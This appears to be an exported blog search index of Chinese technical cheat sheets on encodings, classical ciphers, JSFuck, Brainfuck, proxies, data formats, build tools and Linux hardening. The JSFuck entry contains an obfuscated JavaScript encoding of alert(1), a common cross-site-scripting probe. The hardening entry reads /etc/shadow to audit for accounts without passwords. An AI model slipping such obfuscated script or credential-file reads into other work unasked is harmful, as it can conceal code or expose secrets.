      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Base编码家族]]></title>
    <url>%2F2018%2F08%2F10%2Fbase%2F</url>
    <content type="text"><![CDATA[Base64Base64，顾名思义是一种基于64个可打印字符来表示二进制数据的表示方法，这64个字符分别为A-Z、a-z、0-9以及+与/。64个字符可用6个比特位表示，3个字节有24个比特位，对应于4个Base64单元，所以编码后的数据要比原始数据略长，为原来的4/3。Base64索引表如下所示： 数值 字符 数值 字符 数值 字符 数值 字符 0 A 16 Q 32 g 48 w 1 B 17 R 33 h 49 x 2 C 18 S 34 i 50 y 3 D 19 T 35 j 51 z 4 E 20 U 36 k 52 0 5 F 21 V 37 l 53 1 6 G 22 W 38 m 54 2 7 H 23 X 39 n 55 3 8 I 24 Y 40 o 56 4 9 J 25 Z 41 p 57 5 10 K 26 a 42 q 58 6 11 L 27 b 43 r 59 7 12 M 28 c 44 s 60 8 13 N 29 d 45 t 61 9 14 O 30 e 46 u 62 + 15 P 31 f 47 v 63 / 编码Hello的过程如下： 文本 H e l l o ASCII编码 72 101 108 108 111 二进制位 ‭01001000‬ ‭01100101‬ ‭01101100‬ ‭01101100‬ ‭01101111‬ 00000000 以6个二进制位进行编码： 二进制位 010010 000110 010101 101100 011011 000110 111100 000000 索引 18 6 21 44 27 6 60 Base64编码 S G V s b G 8 = 若原数据不是3的倍数，且多出1个字节，则在编码末尾加2个=，多出2个字节，则在编码末尾加1个=。换言之，若多出1个字节，则最后一个6位的Base64字节块有4位是0值，若多出2个字节，则最后一个6位的Base64字节块有2位是0值。 Base32与上类似，Base32基于32个可打印字符，分别为A-Z以及2-7。32个字符可用5个比特位表示，5个字节有40个比特位，对应于8个Base32单元，编码后的数据比原始数据略长8/5。若原数据不是5的倍数，且多出1个字节，则在编码末尾加4个=，多出2个字节，则在编码末尾加3个=，多出3个字节，则在编码末尾加2个=，多出4个字节，则在编码末尾加1个=。Base32索引表如下所示： 数值 字符 数值 字符 数值 字符 数值 字符 0 A 8 I 16 Q 24 Y 1 B 9 J 17 R 25 Z 2 C 10 K 18 S 26 2 3 D 11 L 19 T 27 3 4 E 12 M 20 U 28 4 5 F 13 N 21 V 29 5 6 G 14 O 22 W 30 6 7 H 15 P 23 X 31 7 Base16与上类似，Base16基于16个可打印字符，分别为0-9以及A-F。16个字符可用4个比特位表示，1个字节有8个比特位，对应于2个Base16单元，编码后的数据比原始数据略长2。显然，在Base16中不需要在末尾填充=。Base16索引表如下所示： 数值 字符 数值 字符 数值 字符 数值 字符 0 0 4 4 8 8 12 C 1 1 5 5 9 9 13 D 2 2 6 6 10 A 14 E 3 3 7 7 11 B 15 F XXencodeXXencode不属于Base编码家族，但与Base64编码极为类似，区别仅在于64个可打印字符及其顺序，XXencode使用的为+、-、0-9、A-Z、a-z。 UUencodeUUencode也与Base64极为类似，它使用的字符及其顺序为(space)、!、&quot;、#、$、%、&amp;、&#39;、(、)、*、+、,、-、.、/、0-9、:、;、&lt;、=、&gt;、?、@、A-Z、[、\、]、^、_、`。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[古典密码学]]></title>
    <url>%2F2018%2F08%2F10%2Fclassical-crypto%2F</url>
    <content type="text"><![CDATA[古典密码学主要包括两类，即代换和置换。 代换代换密码是将明文中的字符替代成其他字符，即替代转换，若整个加密过程中每个字符采用同一张表替代，则为单表代换密码，类似的，若整个加密过程中每个字符采用不同的表替代，则为多表代换密码，典型的单表代换密码有凯撒密码、培根密码等，多表代换密码有维吉尼亚密码等。 凯撒密码凯撒密码(Caesar cipher)就是将明文中的所有字母都在字母表上向后(或向前)按照一个固定数目进行偏移后被替换成密文。例如，当偏移量为3时，所有的字母A将被替换成D，B变成E，以此类推。明文Hello World的加密过程如下： 取偏移量为3 计算H的后3位为K 以此类推 密文为：Khoor Zruog 类似的，解密过程如下： 计算K的前3位为H 以此类推 明文为：Hello World 注意：当偏移量为13时，这种凯撒密码的特例又被称为ROT13(回转13位)加密，ROT13加密是一种对等加密(Reciprocal cipher)，对等加密是对称加密的一个特例，即该类密码的加密算法是它自己本身的逆反函数，换言之，要对其解密，只需对其密文再次套用加密算法即可。当偏移量未知时，可采用穷举法一个个试，偏移量必定小于26。 培根密码培根密码(Bacon’s cipher)加密时，明文中的每个字母都会转换成一组5个英文字母。其转换依靠下表： 明文 密文 明文 密文 明文 密文 明文 密文 a AAAAA g AABBA n ABBAA t BAABA b AAAAB h AABBB o ABBAB u-v BAABB c AAABA i-j ABAAA p ABBBA w BABAA d AAABB k ABAAB q ABBBB x BABAB e AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB 按照上表，明文hello的密文为AABBBAABAAABABBABABBABBBA，显然，密文的长度是明文长度的5倍。除了上表用来加密小写明文外，还有一张用来加密大写明文的表，如下： 明文 密文 明文 密文 明文 密文 明文 密文 明文 密文 A aaaaa G aabba M abbaa S baaba Y bbaaa B aaaab H aabbb N abbab T baabb Z bbaab C aaaba I abaaa O abbba U babaa D aaabb J abaab P abbbb V babab E aabaa K ababa Q baaaa W babba F aabab L ababb R baaab X babbb 同理，明文HELLO的密文为aabbbaabaaababbababbabbba。注意：虽然表中出现了A B两种字符，但培根密码的本质是二进制，即用两种不同的特征来加密明文，可以是字母的大小写或字体的样式等等。例如采用字母的大小写加密hello为GOod gOOd STUdY, dAY dAy UP, haHa，其中大写代表A，小写代表B；类似的，也可以用粗体代表A，正常代表B，以字体的样式加密hello。显然，培根密码所包含的信息可以和用于承载其的文章完全无关。 维吉尼亚密码维吉尼亚密码是使用一系列凯撒密码组成密码字母表的加密算法，用来加解密的维吉尼亚表格如下所示：这一表格包括了26行字母表，每一行都由前一行向左偏移1位得到。行为明文行，列为密钥列，密文位于表格内。明文HELLOWORLD的加密结果如下： 选择某一关键词作为密钥，如SECRET 对于明文第1个字母H，对应密钥的第1个字母S，于是使用表格中S行字母表进行加密，得到密文第一个字母Z 以此类推，若密钥长度小于明文长度，则转到密钥第1个字母继续循环，最终得到密文ZINCSPGVNU 类似的，解密过程如下： 根据密钥第1个字母S所对应的S行字母表，发现密文第1个字母Z位于H列，因而明文第1个字母为H 依次类推 显而易见，维吉尼亚密码相对于本文介绍的其他古典密码，很难利用穷举法破解。 置换置换密码是将明文中的字母重新排列，字母本身不变，但其位置改变，即位置转换，典型的有栅栏密码等。 栅栏密码栅栏密码(Rail fence cipher)，又称篱笆密码，就是把要加密的明文分成n个一组，然后把每组的第一个字连起来，紧接着把每组的第二个字连起来，以此类推，形成一段无规律的话。明文Hello World的加密过程如下： 去掉空格：HelloWorld 5个一组：Hello，World 取出每组第1个字母：HW 取出每组第2个字母：eo 以此类推 连在一起：HWeolrllod 加上适当空格：HWeol rllod 类似的，解密过程如下： 去掉空格：HWeolrllod 分成5栏：HW、eo、lr、ll、od 取出每栏第1个字母：Hello 依次类推 连在一起：HelloWorld 加上适当空格：Hello World 注意：这里栅栏的栏数取决于n的取值，一般而言，n要整除字母数，n不可能大于或等于字母数，当不知道n为多少时，可采用穷举法一个个试。 其他当铺密码准确来说，当铺密码不是一种加密方式而是一种编码方式，它是将中文和数字进行转化的算法，具体为：当前汉字有多少笔画出头，就转化成数字几。如王夫 井工 夫口 由中人即为67 84 70 123。 猪圈密码猪圈密码(Pigpen cipher)，又称共济会密码(Masonic cipher)，是一种以格子为基础的简单代换式密码。下图为猪圈密码中所用符号与26个英语字母之间的对应关系：明文X MARKS THE SPOT的加密结果如下： 变形猪圈密码还有一种变形，即采用图片中字符位置一一对应的形式加解密，如FLAG可加密为OCJP。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSFuck]]></title>
    <url>%2F2018%2F08%2F10%2Fjsfuck%2F</url>
    <content type="text"><![CDATA[JSFuck是一种JavaScript的编码方式，它的命名起源于Brainfuck，同样，为了避讳脏话，它又被写作JSF*ck，以JSFuck风格写出的代码不需要另外的编译器或解释器执行，原生的JavaScript解释器即可直接运行。JSFuck种共使用[、]、(、)、!、+这6种字符。alert(1)这段JavaScript代码用JSFuck风格表示如下所示：1[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])() 要将任意的JavaScript代码编码为JSFuck风格，可前往JSFuck。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Brainfuck]]></title>
    <url>%2F2018%2F08%2F09%2FBrainfuck%2F</url>
    <content type="text"><![CDATA[Brainfuck是在1993年创建的一种极小化的计算机语言，由于fuck在英语中是脏话，这种语言有时也被称为Brainf*ck或Brainf***，或被简称为BF。Brainfuck中共有8种字符，它们及其含义如下所示： &gt;：指针加一 &lt;：指针减一 +：指针指向的字节的值加一 -：指针指向的字节的值减一 .：输出指针指向的单元内容(ASCII码) ,：输入内容到指针指向的单元(ASCII码) [：如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处 ]：如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处 下面是一个用Brainfuck在屏幕上打印Hello World的程序例子：123++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;. 程序的运行结果如Brainfuck Visualizer所示。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[《TAOUP》读书笔记]]></title>
    <url>%2F2018%2F08%2F02%2Ftaoup%2F</url>
    <content type="text"><![CDATA[我没有写错，本文所记述的不是Knuth的那本举世瞩目的TAOCP(计算机程序设计艺术)，而是ESR所写的TAOUP，即The Art of UNIX Programming(UNIX编程艺术)。 哲学Unix的设计哲学总体上可以概括为以下几点： 模块原则：使用简洁的接口拼合简单的部件 清晰原则：清晰胜于机巧 组合原则：设计时考虑拼接组合 分离原则：策略同机制分离，接口同引擎分离 简洁原则：设计要简洁，复杂度能低则低 吝啬原则：除非却无它法，不要编写庞大的程序 透明性原则：设计要可见，以便审查和调试 健壮原则：健壮源于透明与简洁 表示原则：把知识叠入数据以求逻辑质朴而健壮 通俗原则：接口设计避免标新立异 缄默原则：如果一个程序没什么好说的，就沉默 补救原则：出现异常时，马上退出并给出足够错误信息 经济原则：宁花机器一分，不花程序员一秒 生成原则：避免手工hack，尽量编写程序去生成程序 优化原则：雕琢前先要有原型，跑之前先学会走 多样原则：决不相信所谓“不二法门”的断言 扩展原则：设计着眼未来，未来总比预想来得快 所有的Unix哲学浓缩为一条铁律就是KISS原则，即Keep It Simple, Stupid！]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于代理那些事]]></title>
    <url>%2F2018%2F07%2F26%2Fabout-proxy%2F</url>
    <content type="text"><![CDATA[正向连接与反向连接正向连接即黑客主动连接受害者，这种情况下要求受害者有公网IP，常用于对服务器的渗透；反向连接即受害者主动连接黑客，这种情况下要求黑客有公网IP，常用于对个人的渗透。 正向代理与反向代理在英语中，Proxy表示服务器代理这种动作，而Agent表示代理服务器这种物质，显然，我们这里讨论的是Proxy这种动作，而非代理服务器本身。不论正向还是反向，代理都是基于这样一个事实：即A与B的通信要经过C的转发，这里的C就是Agent，为了方便讨论，我们将A视为客户端，将B视为服务器端。正向代理(Forward Proxy)：也就是常说的代理，代理服务器偏向于客户端，服务器端只能得到代理服务器的IP地址，隐藏了客户端的IP地址。常用于科学上网工具。反向代理(Reverse Proxy)：代理服务器偏向于服务器端，客户端只能得到代理服务器的IP地址，隐藏了服务器端的IP地址。常用于网站镜像等。 端口转发与端口映射传统意义上，我们认为端口转发(Port Forwarding)与端口映射(Port Mapping)表达同样的内容。顾名思义，端口转发指的是将某个IP的某个端口转发到另一个IP的另一个端口，这样，可以通过访问后者以达到访问前者的目的。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XML、JSON与YAML]]></title>
    <url>%2F2018%2F07%2F21%2Fxml-json-yaml%2F</url>
    <content type="text"><![CDATA[XML、JSON与YAML是三种常见的信息标记形式，这三者由于其特有的属性而在不同的领域广为使用。 XMLXML，Extensible Markup Language(可扩展标记语言)，倘若我要表示某个人的简要信息，用XML可写为：12345678910&lt;person&gt; &lt;firstName&gt;Tian&lt;/firstName&gt; &lt;lastName&gt;Song&lt;/lastName&gt; &lt;address&gt; &lt;streetAddr&gt;中关村南大街5号&lt;/streetAddr&gt; &lt;city&gt;北京市&lt;/city&gt; &lt;zipcode&gt;100081&lt;/zipcode&gt; &lt;/address&gt; &lt;prof&gt;Computer System&lt;/prof&gt;&lt;prof&gt;Security&lt;/prof&gt;&lt;/person&gt; JSONJSON，JavaScript Object Notation(JavaScript对象表示法)，倘若我要表示某个人的简要信息，用JSON可写为：12345678910&#123; &quot;firstName&quot; : &quot;Tian&quot;, &quot;lastName&quot; : &quot;Song&quot;, &quot;address&quot; : &#123; &quot;streetAddr&quot; : &quot;中关村南大街5号&quot;, &quot;city&quot; : &quot;北京市&quot;, &quot;zipcode&quot; : &quot;100081&quot; &#125;, &quot;prof&quot; : [&quot;Computer System&quot;, &quot;Security&quot;]&#125; YAMLYAML，在开发这种语言之初，其意为Yet Another Markup Language(仍是一种标记语言)，之后为了强调这种语言以数据作为中心，而不是以标记语言为重点，故解释为YAML Ain’t a Markup Language(YAML不是一种标记语言)，倘若我要表示某个人的简要信息，用YAML可写为：123456789firstName : TianlastName : Songaddress : streetAddr : 中关村南大街5号 city : 北京市 zipcode : 100081prof : -Computer System-Security 比较XML是最早的通用信息标记语言，可扩展性好，但繁琐，主要用于Internet上的信息交互与传递，以及用户界面的编写，比如Android；JSON中的信息有类型，适合程序处理(js)，较XML简洁，主要用于移动应用云端和节点的信息通信，无注释；YAML信息无类型，文本信息比例最高，可读性好，主要用于各类系统的配置文件，有注释易读。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Markdown小记]]></title>
    <url>%2F2018%2F07%2F21%2Fmarkdown-cheatsheet%2F</url>
    <content type="text"><![CDATA[Markdown是一种轻量标记语言，其文件后缀名为.md，它允许人们采用其规定的语法编写文档，而后Markdown解析器会将其转化为有效的HTML文档，以便在网页中显示，时至今日，有许多Markdown解析器增强了Markdown的基本语法。 基本语法标题# 一级标题#### 四级标题对应HTML，最高6级标题。 列表- 无序列表项- 无序列表项- 无序列表项 1. 有序列表项2. 有序列表项3. 有序列表项 链接[Howie’s Blog](http://howiezhao.com)超文本链接必须带http。 图片![一张图片](/images/abc.jpg)当图片无法显示时，则显示中括号中的语句。图片的路径为相对路径，即当前markdown文件所在路径下的images中的abc.jpg。 字体*斜体***粗体** 代码```这里是多行代码``` `这里是单行代码` 表格表头1 | 表头2-– | -–单元格1 | 单元格2单元格3 | 单元格4 引用> 这是引用 横线-–，这是一条水平区分线，用3个或以上的短横线表示 转义和传统编程语言一样，markdown使用 \ 转义以上特殊字符。 最佳实践 在特殊字符与要书写的文字之间加上空格 不同段之间加一空行 链接后加一个空格 GitHub Flavored MarkdownGitHub Flavored Markdown，简记为GFM，即GitHub风格的Markdown语法，是GitHub中编辑器使用的Markdown语法格式，略微区别于标准的Markdown语法，主要如下： 链接自动识别：GFM会自动为标准的URL加上链接 语法着色：在```后输入语言，即可着色 删除线：使用~~表示删除线 任务列表：使用- []或- [1]表示未勾选或已勾选的列表]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Udacity：Apollo起步学习笔记]]></title>
    <url>%2F2018%2F07%2F21%2Fudacity-apollo%2F</url>
    <content type="text"><![CDATA[本笔记记录自ud0419-无人驾驶第一课：从Apollo起步。 一、无人驾驶概览无人驾驶车的6个等级： 0级——基本等级：驾驶员是系统的唯一决策者。 1级——驾驶员辅助(Driver Assistance)：车辆为驾驶员提供转向或加速支持，驾驶员必须保持充分参与。 2级——部分自动化(Partial Automation)：车辆自动控制几项功能，如自动巡航控制和车道保持，但是驾驶员仍然必须执行自治系统处理的任何功能。 3级——有条件的自动化(Conditional Automation)：车辆自主驾驶，但驾驶员必须准备在必要的时候随时接管。 4级——高度自动化(No Human Interference)：车辆控制驾驶体验的所有面面，并且不期望驾驶员的介入，车辆可能根本没有方向盘或任何驾驶员控制装置，但是车辆可能被限制在某些区域，通常这被称为“地理围栏”，车辆可以在特定的地理围栏内完全自主的运行，但是在地理围栏之外，车辆不能自主操作，或者根本无法操作。 5级——完全自动化(Full Automation)：车辆可以在人类可以驾驶的任何地方完全自主地运行，在所有情况下应与人类驾驶员的水平一样高或比其更高。 无人驾驶车的5个核心部件： 计算机视觉(Computer Vision)：通过摄像头图像弄清楚我们周围的世界是怎样的。 传感器融合(Sensor Fusion)：合并来自其他传感器的数据，如激光和雷达，从而更加深入的了解我们周围的环境。 定位(Localization)：精确的确定我们在那个世界所处的位置。 路径规划(Path Planning)：绘制这个世界的路线，帮助我们到达我们想去的地方。 控制(Control)：为了让汽车沿着我们在路径规划期间建立的轨道。 Apollo技术框架包含的4个层面： 参考车辆平台 参考硬件平台 开源软件平台 云服务平台 二、高精度地图]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>无人驾驶</tag>
        <tag>Apollo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于PowerShell]]></title>
    <url>%2F2018%2F07%2F16%2Fabout-powershell%2F</url>
    <content type="text"><![CDATA[PowerShell是微软用来取代CMD的一个强大的Shell。 版本在不同版本的Windows中已经内置了不同版本的PowerShell，常见情况如下： Windows XP SP2 / Server 2003 SP1：PowerShell 1.0 Windows 7 / Server 2008：PowerShell 2.0，此版本包含了PowerShell ISE，即Integrated Scripting Environment(集成的脚本环境)，用来方便的编写PowerShell脚本。 Windows 8 / Server 2012：PowerShell 3.0，从此版本开始，PowerShell被集成进了WMF中，即Windows Management Framework(Windows管理框架)。 Windows 8.1 / Server 2012 R2：PowerShell 4.0 Windows 10：PowerShell 5.0，此版本的WMF包含了PowerShellGet，可用于在线下载、安装模块。 优势及劣势PowerShell相较于CMD的优势是不言而喻的，相较于Unix中的Shell，它的优势主要体现在2方面：面向对象特性以及与.NET的深度结合。劣势当然也有，相较于CMD，至今为止它的启动速度仍然较慢，相较于Unix中的Shell，它的生态环境还欠火候，可以期待未来有更多的人关注到PowerShell。 Cmdlets与pipelineCmdlets与pipeline是PowerShell中的两个核心概念， 常用命令PowerShell中的大多数常用命令都有对应于Linux中相关命令的别名，比如ls、mv、ps、cat、kill、wget等，下面介绍的命令为PowerShell所不同于Linux中的命令。1234Get-Host #查看PowerShell版本信息help #查看帮助信息Install-Module #从powershellgallery.com下载安装第三方模块Import-Module #导入模块，安装的模块需要先导入才能使用 常用模块 posh-git：PowerShell中的Git增强模块 oh-my-posh：类似于oh-my-zsh PSReadline：一个增强的命令行编辑模块 windows-screenfetch：Windows下的screenfetch模块]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows10的传递优化]]></title>
    <url>%2F2018%2F07%2F16%2Fdelivery-optimization%2F</url>
    <content type="text"><![CDATA[为了方便快速的下载Windows更新，微软在Windows10中启用了一种新的更新机制，即传递优化(Delivery Optimization)，这本质上是一种P2P架构，换句话来说，倘若开启了传递优化功能，更新时将会额外的从别的已更新的且开启传递优化功能的电脑上下载，同时也会上传已更新的文件到需要更新的电脑上。值得注意的是，传递优化对局域网进行了特殊处理，即当局域网内一台电脑完成更新后，传递优化会使得此局域网内的其他电脑依次完成更新。开启或关闭传递优化的设置路径为：设置 ——&gt; 更新和安全 ——&gt; Windows更新 ——&gt; 高级选项 ——&gt; 传递优化。传递优化用于上传的文件路径位于：C:\Windows\Logs\dosvc。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[useradd与adduser]]></title>
    <url>%2F2018%2F07%2F16%2Fuseradd-adduser%2F</url>
    <content type="text"><![CDATA[在Linux中创建用户可以用useradd或者adduser，值得注意的是创建的用户并不一定可以登录，登录的用户肯定要有它的用户主目录、登录Shell等相关配置，而这两个命令之间的差异就在于此。 adduser当使用adduser howie命令时，系统除了创建howie用户，还会自动创建用户主目录、同名用户组、登录Shell等，并提示输入用户密码，这一切操作都将以一个对话的形式完成。 useradd当使用useradd howie命令时，系统只会创建howie用户，而不会创建用户密码、用户主目录、同名用户组、登录shell等，若要指定密码，可以接着采用passwd howie命令。其次，useradd有众多参数，我们可以通过使用这些参数来达到和adduser一样的效果，如useradd -d /home/howie -m -s /bin/bash howie，不过注意之后还得使用passwd命令创建密码，当然也可以使用-p参数直接设置密码，但这样会将密码直接显示在终端屏幕上，不安全。 userdel当使用userdel howie命令时，系统只会删除howie用户，并不会删除用户主目录以及用户邮箱目录，因此可以使用-r参数。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[云服务的三种模式]]></title>
    <url>%2F2018%2F07%2F15%2Fxaas%2F</url>
    <content type="text"><![CDATA[云服务的模式一般有IaaS、PaaS、SaaS三种，既然是云服务，也即我们不用购买真实的计算设备，所有的模式都是基于此之上的。 IaaSIaaS，Infrastructure as a Service(基础设施即服务)，云服务的最底层，服务商提供操作系统、存储设施、硬件配置等资源，典型的例子是VPS，即Virtual Private Server(虚拟专用服务器)，这类服务一般提供必要的Shell接口，可使用户连接到操作系统进行相关配置，常见的VPS厂商有Amazon EC2、阿里云 ECS等。 PaaSPaaS，Platform as a Service(平台即服务)，云服务的中间层，服务商提供必要的应用，用户无权访问操作系统及硬件等资源，典型的例子是虚拟空间，这类服务一般会提供必要的Web服务器、数据库等，用户可以直接在其上部署Web应用，我用过的虚拟空间有老薛主机，常见的PaaS厂商有Google App Engine(GAE)、Heroku等。 SaaSSaaS，Software as a Service(软件即服务)，云服务的最高层，直接提供现成的应用供用户使用，用户所付出的精力最少，例如本站采用的Hexo、WordPress等。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[编译与构建]]></title>
    <url>%2F2018%2F07%2F15%2Fcompile-build%2F</url>
    <content type="text"><![CDATA[编译编译(compile)，一般而言是将源代码转换成汇编代码，用以实现这种过程的工具称为编译器(compiler)。但要注意，编译器在同一时刻只能转换一个编译单元，所谓编译单元是指单个的源文件。目前在Linux中使用最广的编译器是GCC，即GNU Compiler Collection(GNU编译器套装)，GCC的原名为GNU C Compiler(GNU C语言编译器)，因为在后续逐渐支持了C++、Java等更多的语言，所以更改了其缩写的含义。使用GCC编译C语言源代码的一般格式如下：1$ gcc test.c -o test 若不指定生成文件，则默认生成a.out。 构建程序通常由多个编译单元组成，倘若逐个的去编译，这多少显得有点琐碎，因此我们需要一个自动化工具用来从源代码生成用户可以使用的目标，而这个工具就是构建系统(build system)，构建系统所作的就是构建(build)，构建的过程中肯定会调用到编译。从这个意义上来说，构建的范围比编译更广。在Linux中使用最广的构建系统是GNU make，它会读取makefile文件中的配置信息来完成构建，makefile的简要格式如下：12345678editor : main.o text.o gcc -o editor main.o text.omain.o : main.c def.h gcc -c main.c #-c参数指定生成.o文件text.o : text.c com.h gcc -c text.cinstall : editor mv editor /usr/local 冒号前面为target，即要生成的文件；冒号后面为dependencies，即被依赖的文件；每一个target:dependencies对的下一行为要执行的命令。当make不带参数时，默认执行第一个target。target也可以是要求make要完成的动作，执行这种target后并不能得到和target同名的文件，因此，也称做伪target，如第7行所示。dependencies可以为空，如常用的target为clean时，就没有依赖，只有命令。当输入make或make editor，即可开始构建。若editor这个target文件不存在，或者main.o、text.o这两个依赖文件被修改，都会导致make调用其下的命令gcc -o editor main.o text.o；接下来，由于引用到main.o和text.o，make会检查main.o的依赖main.c、def.h有无更新，如果有，则执行其下的命令gcc -c main.c；同理，也适用于text.o。当输入make install，make会检查install的依赖editor是否是最新，如果是，则执行其下的命令mv editor /usr/local。makefile中也可以包含宏，上面的文件使用宏后如下所示：12345678910OBJECTS = main.o text.oINSTALL_PATH = /usr/localeditor : $(OBJECTS) gcc -o editor $(OBJECTS)main.o : main.c gcc -c main.ctext.o : text.c gcc -c text.cinstall : editor mv editor $(INSTALL_PATH) 另外的为了在Windows中使用GCC，诞生了MinGW 项目，即Minimalist GNU for Windows(适用于Windows的极简GNU)，它是将GCC编译器和GNU Binutils移植到Win32平台下的产物，又被称为mingw32。另有可用于产生32位及64位Windows可执行文件的MinGW-w64项目，是从原MinGW项目产生的分支。Java世界中使用最广的构建系统是Maven，而在Android Studio中则使用到了后起之秀Gradle。C语言从源代码到可执行文件的过程依次经过了预处理、编译、链接这几个步骤，即我们常说的GCC是编译器，但它实际可以完成的工作不止是编译，具体生成结果取决于我们的参数。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux系统加固]]></title>
    <url>%2F2018%2F05%2F19%2Flinux-reinforcement%2F</url>
    <content type="text"><![CDATA[帐户与口令此方面的加固主要为了防止针对帐户的暴力破解。 禁用或删除无用帐户：使用命令userdel &lt;用户名&gt;删除不必要的帐户，使用参数-r即可删除相应用户的家目录和邮箱目录。使用命令passwd -l &lt;用户名&gt;锁定不必要的帐户，解锁可使用passwd -u &lt;用户名&gt;。 检查特殊帐户：使用命令awk -F: &#39;($2==&quot;&quot;)&#39; /etc/shadow查看空口令帐户，若存在，则使用命令passwd &lt;用户名&gt;为空口令帐户设定密码。使用命令awk -F: &#39;($3==0)&#39; /etc/passwd查看uid为0的帐户，确认uid为0的帐户只有root帐户。 添加口令策略：使用命令change -m 0 -M 30 -E 2020-01-01 -W 7 &lt;用户名&gt;修改帐户口令策略，-m表示密码最小使用天数，-M表示密码最大使用天数，-E表示密码到期时间，-W表示密码到期前多少天提醒。或者可以直接编辑/etc/login.defs文件进行修改。 设置用户锁定：在CentOS7中，编辑/etc/pam.d/system-auth文件，添加auth required pam_tally2.so onerr=fail deny=6 unlock_time=300此行，表示当密码连续输错6次后锁定，锁定时间300秒。限制能su到root的用户：编辑/etc/pam.d/su文件，添加auth required pam_wheel.so group=test此行，表示只允许test组用户su到root。 服务安全服务越少，系统越安全。 关闭不必要的服务：在CentOS中，使用命令chkconfig --level &lt;init级别&gt; &lt;服务名&gt; on|off|reset设置服务在指定init级别下开机是否启动。 SSH服务安全：编辑/etc/ssh/sshd_config文件，修改默认端口，即Port项；禁止root用户远程登录，即PermitRootLogin项；禁止空密码登录，即PermitEmptyPasswords项；限制登录密码输错次数；最好使用密钥登录而不是密码登录。 文件系统安全权限越小，系统越安全 设置umask值：编辑/etc/profile文件，修改umask值为027。 设置登录超时：编辑/etc/profile文件，添加TIMEOUT=180，即登录后无操作3分钟将超时断开连接。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows系统加固]]></title>
    <url>%2F2018%2F05%2F19%2Fwindows-reinforcement%2F</url>
